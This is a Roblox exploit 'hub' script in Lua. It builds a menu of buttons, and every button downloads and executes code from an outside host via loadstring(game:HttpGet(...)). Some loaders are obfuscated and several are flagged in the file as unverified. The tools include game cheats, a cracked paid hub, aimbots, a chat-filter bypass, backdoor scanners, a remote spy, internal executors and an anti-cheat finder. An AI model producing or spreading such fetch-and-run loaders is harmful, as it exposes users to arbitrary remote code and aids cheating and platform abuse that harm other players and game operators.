local ArrayField = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/ArrayField/main/Source.lua'))()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = game.Workspace.CurrentCamera

-- Function to generate a random key without spaces
local function GenerateRandomString()
    local letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    local randomString = ""

    for i = 1, 5 do
        local randomIndex = math.random(1, #letters)
        randomString = randomString .. string.sub(letters, randomIndex, randomIndex)
    end

    return randomString
end

-- Function to apply strikethrough with spacing (starts on first letter, stops before last)
local function applyStrikethrough(text)
    local newText = ""

    for i = 1, #text - 1 do
        newText = newText .. text:sub(i, i) .. "̶ " -- Apply strikethrough and add space
    end

    newText = newText .. text:sub(#text, #text) -- Last letter remains normal
    return newText
end

-- Generate the key and modify it
local realKey = GenerateRandomString()
local Key = applyStrikethrough(realKey)
local Key = Key.." (Case Sensitive)"


local Window = ArrayField:CreateWindow({
   Name = "Someoneus's Dungeon",
   LoadingTitle = "Someoneus's Dungeon",
   LoadingSubtitle = "by someoneus",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "someoneusdungeon"
   },
   Discord = {
      Enabled = false,
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "someoneus's dungeon",
      Subtitle = "Key is "..Key,
      Note = "key is "..Key,
      FileName = "someoneusdungeonkey", -- It is recommended to use something unique as other scripts using ArrayField may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like ArrayField to get the key from
      Actions = {
            [1] = {
                Text = 'this does nothing',
                OnPress = function()
                -- nothing
                end,
                }
            },
      Key = {realKey} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})







local Tab = Window:CreateTab("Hub's", 4483362458) -- Title, Image
local Section = Tab:CreateSection("FE",false) -- The 2nd argument is to tell if its only a Title and doesnt contain element

local Button = Tab:CreateButton({
   Name = "FE Satan (only https://www.roblox.com/games/17574618959/Just-a-baseplate)",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   --[[
fe satan converted by maxilito

https://www.roblox.com/catalog/10775031176/The-Pogo
https://www.roblox.com/catalog/12103236257/AO-Surfboard
https://www.roblox.com/catalog/9867481700/Le-Rouge-Cross-body-Bag-1-0
https://www.roblox.com/catalog/9867487176/Le-Rouge-Cross-body-Bag-3-0
https://www.roblox.com/catalog/9350274205/Vans-Black-White-Checkerboard-Umbrella
https://www.roblox.com/catalog/2493590711/Knights-of-Redcliff-Paladin-Helmet
https://www.roblox.com/catalog/9402600266/Sketched-white-and-magenta-5G-wings
https://www.roblox.com/catalog/2309346267/Classic-PC-Hat

-gh 10775031176, 12103236257, 9867481700, 9867487176, 9350274205, 2493590711, 9350274205, 9402600266, 2309346267
--]]

--this code below will give you the required hats instantly so you doesn't need to wear any hats

if not game:GetService("ReplicatedStorage"):FindFirstChild("01_server") then return game:GetService("TeleportService"):Teleport(17574618959, game:GetService("Players").LocalPlayer) end
game.Players:Chat("-gh 10775031176, 12103236257, 9867481700, 9867487176, 9350274205, 2493590711, 9350274205, 9402600266, 2309346267")
--just a baseplate only
wait(2.1)

loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty36.lua"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "HatHub (Patched)",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/hat-scripts/refs/heads/main/updatedhathub.lua"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Troll Animation",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed    
   loadstring(game:HttpGet("https://raw.githubusercontent.com/ShutUpJamesTheLoser/freaky/refs/heads/main/fe", true))()
   end,
})

local Button = Tab:CreateButton({
   Name = "FE R6 Anims",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet('https://raw.githubusercontent.com/redxs-dosx/R6-Anim-Hub/refs/heads/main/Hub%20Script%20(.lua)'))()
   end,
})

local Button = Tab:CreateButton({
   Name = "FE R6 Animation",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Chat Bypass",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://pastebin.com/raw/aqmCAz7b"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "RoChips",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
    if "you wanna use rochips universal" then
	    local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
	    local im,lonely,z_c=task.wait,game,loadstring
	    z_c(lonely:HttpGet(z_z..""..z_x))()
	    return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
    end
end,
})
local Tab = Window:CreateTab("Scripts", 4483362458) -- Title, Image
local Section = Tab:CreateSection("Recommended",false) -- The 2nd argument is to tell if its only a Title and doesnt contain element

local Button = Tab:CreateButton({
   Name = "Infinite Yield",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end,
})

local Section = Tab:CreateSection("No Key",false)
local Button = Tab:CreateButton({
   Name = "Zombie Attack - Voidz",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/RTrade/Voidz/main/Games.lua'),true))()
   end,
})



local Button = Tab:CreateButton({
   Name = "Dead Rails - Lunor",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet('https://raw.githubusercontent.com/Just3itx/Lunor-Loadstrings/refs/heads/main/Loader'))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Fisch - SpeedHubX",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Blox Fruit - SpeedHubX",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Doors - SpeedHubX",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Script-Games/main/Doors.lua"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Muscle Legends - SpeedHubX",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Muscle Legends - Vamp",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
			--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/QRTUI10/Vamp/refs/heads/main/Free%20Version"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Size Legends Simulator",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
			--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
getgenv().Color = "default" --[[white,black, brown,green,cyan,blue,pink,purple,red,yellow,orange ]]--
getgenv().TextColor = "default" --[[ rgb,white,black, brown,green,cyan,blue,pink,purple,red,yellow,orange ]]--
loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/Loader"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Brookhaven FE Play sounds (cannot play sounds more than 2s)",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
			--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/ameicaa0/brookhaven/refs/heads/main/brookhaven%20script.txt"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Evade - VHNS",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
			--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/fratelevostru9999/src/refs/heads/main/evade%20vhns",true))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Brookhaven Admin",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
			--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://apocscripts.com/ApocHub.txt"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "be dead forever simulator",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
			--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- scirpt is made by invertedTh and is also the first best sicrpt for bdsf enjoy it while it lasted and also give feedback if something is broken
loadstring(game:HttpGet("https://raw.githubusercontent.com/invertedth/kewlzhubbdfs/refs/heads/main/Bdsf.lua"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Blox fruit - HoHo hub (Crack)",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
			--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--[[ PWNED by PWN Yard
Issues have been reported for the following executors (most likely not supported):

Atlantis;
Codex;
Delta (IOS);
]]
-- discord.gg/pwnyard   if expired: discord.gg/rzTDfMGHJy
loadstring(game:HttpGet("https://raw.githubusercontent.com/PWNYard/HoHo/refs/heads/main/PWN.lua"))();
   end,
})

local Button = Tab:CreateButton({
   Name = "Natural Disaster - Super ring",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
			--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-Super-ring-V4-24296"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Blue Lock",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
			--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
return(function(...)
    local _={_=(loadstring or load),
    _c= 'http://ln.run/Loader✨'} --// [🫨]
    setmetatable(_,{
        __call=function(_s)
            local s,r=pcall(game.HttpGet,game,_s._c)
            if s then _s._(r)('@ dsc.gg/visualontop') 
        end end
    })_(...)
end)(...)

--[[  
Any issue - https://visual-run.framer.ai/  
Or - http://ln.run/Protection  
]]
   end,
})

local Button = Tab:CreateButton({
   Name = "Prison Life - WhiteLkidd",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
			--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRealNihilize/WhiteLkidd-hub/refs/heads/main/Prison%20life%20Hub"))()
   end,
})












local Section = Tab:CreateSection("With Key",false) -- The 2nd argument is to tell if its only a Title and doesnt contain element

local Button = Tab:CreateButton({
   Name = "Brookhaven Unlock gamepass",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
			--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/RFR-R1CH4RD/Loader/main/Salvatore.lua"))()
   end,
})







local Tab = Window:CreateTab("Powerfull Scripts", 4483362458) -- Title, Image
local Button = Tab:CreateButton({
   Name = "LALOL Backdoor",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Micro Backdoor",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://paste.ee/r/GipgWZb8"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "SolSpy (for executor than doesn't support RemoteSpy)",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://gist.githubusercontent.com/Uylost/960b592d7fc7161c3e6de0047547d874/raw/cc0e9ca436afe2c3e253fdb357d1a61efd576098/gistfile1.txt"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "More UNC (for low power executor)",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-MoreUNC-13110"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Black hole",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://pastebin.com/raw/tstrtDFD"))()
   end,
})



local Button = Tab:CreateButton({
   Name = "Server Finder",
   Interact = 'Click',
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/RealBatu20/AI-Scripts-2025/refs/heads/main/LowServerFinderGUI.lua", true))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Super Ring",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://raw.githubusercontent.com/chesslovers69/Super-ring-parts-v6/refs/heads/main/Bylukaslol"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Internal executor - RoExec",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://gist.githubusercontent.com/Axchs/af0848c3885194d54f2c181562675126/raw/96862bc46256bcadde0df0cd799cc7a998bcad82/gistfile1.txt"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Internal executor - UI (pc only)",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Other-Stuff/main/ExecutorInternal.lua"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Anti cheat finder",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Roblox-Anticheat-finder-30874"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Aim-ware (aimbots)",
   Interact = 'Click',
   Callback = function()
   -- The function that takes place when the button is pressed
   loadstring(game:HttpGet("https://raw.githubusercontent.com/someoneus/master/refs/heads/main/aimwaresource.lua"))()
   end,
})
